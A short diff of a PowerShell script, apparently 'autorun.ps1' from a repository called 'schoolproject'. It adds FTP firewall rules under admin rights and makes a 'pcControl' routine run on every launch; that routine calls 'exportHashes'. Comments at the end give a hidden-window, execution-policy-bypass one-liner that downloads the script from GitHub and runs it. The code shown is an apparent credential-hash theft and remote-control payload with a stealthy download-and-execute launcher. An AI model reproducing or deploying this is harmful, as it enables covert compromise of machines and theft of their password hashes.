@@ -22,8 +22,6 @@ if(Test-IsAdmin) # Check privileges
     echo "Setting up Firewall";
     New-NetFirewallRule -DisplayName "FTP-in"  -Direction Inbound -Program "C:\\Windows\\system32\\ftp.exe" -Action Allow >$null;
     New-NetFirewallRule -DisplayName "FTP-out"  -Direction Outbound -Program "C:\\Windows\\system32\\ftp.exe" -Action Allow >$null;
-    
-    pcControl;
 }
 else
 {
@@ -97,6 +95,7 @@ function pcControl() # 4 - PC(not in)Control
     exportHashes;
 }
 
+pcControl;
 
 #powershell -ExecutionPolicy Bypass -File .\autorun.ps1
 #powershell -Sta -Nop -Window Hidden wget https://raw.githubusercontent.com/sJ3Wpid/schoolproject/main/autorun.ps1 -outfile run.ps1; powershell -Sta -Nop -Window Hidden -ExecutionPolicy Bypass -File .\run.ps1
